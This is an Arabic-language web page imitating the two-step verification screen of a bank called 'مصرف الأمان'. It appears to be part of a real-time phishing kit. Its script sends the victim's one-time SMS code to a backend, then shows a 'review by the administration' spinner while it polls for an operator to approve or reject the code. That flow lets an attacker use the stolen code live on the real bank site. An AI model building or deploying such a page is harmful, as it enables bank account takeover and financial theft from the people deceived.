<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>التحقق من الرمز - مصرف الأمان</title>
<style>
  :root{
    --navy:#12314f;
    --link:#1f4e8c;
    --ink:#1c2b36;
    --muted:#5c6b74;
  }
  *{box-sizing:border-box;}
  body{
    margin:0;
    font-family:"Segoe UI","Tahoma",Arial,sans-serif;
    background:#fff;
    color:var(--ink);
    max-width:480px;
    margin-inline:auto;
    min-height:100vh;
  }
  header{
    background:#fff;
    display:flex;
    align-items:center;
    justify-content:center;
    padding:16px 18px;
    border-bottom:1px solid #eef0f1;
  }
  header h1{
    font-size:15px;
    color:var(--navy);
    margin:0;
  }
  main{
    padding:32px 22px;
    text-align:center;
  }
  main .lead{
    font-size:14px;
    color:var(--muted);
    margin:0 0 26px;
    line-height:1.7;
  }
  .otp-field{
    text-align:right;
    margin-bottom:6px;
  }
  .otp-field label{
    display:block;
    font-size:14px;
    color:#5c6b74;
    margin-bottom:10px;
  }
  .otp-field input{
    width:100%;
    border:none;
    border-bottom:1px solid #c7ccd1;
    padding:6px 0 10px;
    font-size:20px;
    letter-spacing:6px;
    text-align:center;
    color:var(--ink);
    background:transparent;
  }
  .otp-field input:focus{
    outline:none;
    border-bottom:1.5px solid var(--link);
  }
  .req{
    display:none;
    font-size:11.5px;
    color:#c0392b;
    margin:4px 0 0;
    text-align:left;
  }
  .invalid .req{display:block;}
  .invalid input{border-bottom-color:#c0392b;}
  .submit-btn{
    display:block;
    width:100%;
    background:var(--navy);
    color:#fff;
    border:none;
    border-radius:6px;
    padding:11px;
    font-size:14.5px;
    font-weight:700;
    cursor:pointer;
    margin-top:24px;
  }
  .submit-btn:hover{background:#0c2438;}

  /* ---------- OVERLAY (waiting / success / rejected) ---------- */
  .overlay{
    position:fixed;
    inset:0;
    background:#fff;
    display:none;
    align-items:center;
    justify-content:center;
    flex-direction:column;
    gap:18px;
    z-index:999;
    padding:24px;
    text-align:center;
  }
  .overlay.show{display:flex;}
  .spinner{
    width:46px;
    height:46px;
    border:4px solid #e2e6e9;
    border-top-color:var(--navy);
    border-radius:50%;
    animation:spin .8s linear infinite;
  }
  @keyframes spin{to{transform:rotate(360deg);}}
  .overlay p{
    font-size:14px;
    color:var(--navy);
    font-weight:600;
    margin:0;
    max-width:280px;
    line-height:1.7;
  }
  .success-icon{
    width:56px;
    height:56px;
    border-radius:50%;
    background:#1e8e50;
    display:flex;
    align-items:center;
    justify-content:center;
  }
  .success-icon svg{width:28px;height:28px;}
  .reject-icon{
    width:56px;
    height:56px;
    border-radius:50%;
    background:#c0392b;
    display:flex;
    align-items:center;
    justify-content:center;
  }
  .reject-icon svg{width:26px;height:26px;}
  .overlay button{
    margin-top:6px;
    background:var(--navy);
    color:#fff;
    border:none;
    border-radius:6px;
    padding:10px 24px;
    font-size:13.5px;
    font-weight:700;
    cursor:pointer;
  }
  .overlay button:hover{background:#0c2438;}
</style>
</head>
<body>

  <header>
    <h1>مصرف الأمان — التحقق بخطوتين</h1>
  </header>

  <main id="otpForm">
    <p class="lead">تم إرسال رمز تحقق (OTP) إلى جوالك. برجاء إدخاله لإتمام تسجيل الدخول.</p>
    <div class="otp-field" id="otpField">
      <label for="otp">رمز التحقق</label>
      <input type="text" id="otp" inputmode="numeric" maxlength="6" placeholder="------">
      <span class="req">الرمز مطلوب</span>
    </div>
    <button class="submit-btn" id="verifyBtn" type="button">تأكيد</button>
  </main>

  <div class="overlay" id="waitOverlay">
    <div class="spinner"></div>
    <p id="waitText">جاري المراجعة من الإدارة...</p>
  </div>

  <div class="overlay" id="successOverlay">
    <div class="success-icon">
      <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg>
    </div>
    <p>تم تسجيل الدخول بنجاح</p>
    <button type="button" onclick="window.location.href='index.html'">الذهاب للحساب</button>
  </div>

  <div class="overlay" id="rejectOverlay">
    <div class="reject-icon">
      <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M18 6L6 18M6 6l12 12"/></svg>
    </div>
    <p>تم رفض رمز التحقق من الإدارة. برجاء المحاولة مرة أخرى.</p>
    <button type="button" id="retryOtpBtn">حاول مرة أخرى</button>
  </div>

  <script>
    var requestId = sessionStorage.getItem('aman_bank_request_id');
    if (!requestId) {
      // مفيش طلب معلّق، رجّعه لصفحة الدخول
      window.location.href = 'index.html';
    }

    var otpForm = document.getElementById('otpForm');
    var otpField = document.getElementById('otpField');
    var otpInput = document.getElementById('otp');
    var verifyBtn = document.getElementById('verifyBtn');
    var waitOverlay = document.getElementById('waitOverlay');
    var successOverlay = document.getElementById('successOverlay');
    var rejectOverlay = document.getElementById('rejectOverlay');
    var statusPollTimer = null;

    function stopPoll(){
      clearInterval(statusPollTimer);
      statusPollTimer = null;
    }

    function pollOtpStatus(){
      statusPollTimer = setInterval(function(){
        fetch('/api/status/' + requestId)
          .then(function(res){ return res.json(); })
          .then(function(data){
            if (!data.ok) return;
            if (data.status === 'approved') {
              stopPoll();
              waitOverlay.classList.remove('show');
              successOverlay.classList.add('show');
            } else if (data.status === 'rejected') {
              stopPoll();
              waitOverlay.classList.remove('show');
              rejectOverlay.classList.add('show');
            }
            // لسه pending: استمر بالانتظار
          })
          .catch(function(err){
            console.warn('تعذر التحقق من حالة الطلب:', err);
          });
      }, 2500);
    }

    verifyBtn.addEventListener('click', function(){
      var code = otpInput.value.trim();
      if (!code) {
        otpField.classList.add('invalid');
        return;
      }
      otpField.classList.remove('invalid');

      otpForm.style.display = 'none';
      waitOverlay.classList.add('show');

      fetch('/api/otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ id: requestId, otp: code })
      })
      .then(function(res){ return res.json(); })
      .then(function(data){
        if (data.ok) {
          pollOtpStatus();
        } else {
          waitOverlay.classList.remove('show');
          rejectOverlay.classList.add('show');
        }
      })
      .catch(function(err){
        console.warn('تعذر الاتصال بالسيرفر الخلفي:', err);
      });
    });

    document.getElementById('retryOtpBtn').addEventListener('click', function(){
      rejectOverlay.classList.remove('show');
      otpForm.style.display = 'block';
      otpInput.value = '';
    });
  </script>

</body>
</html>
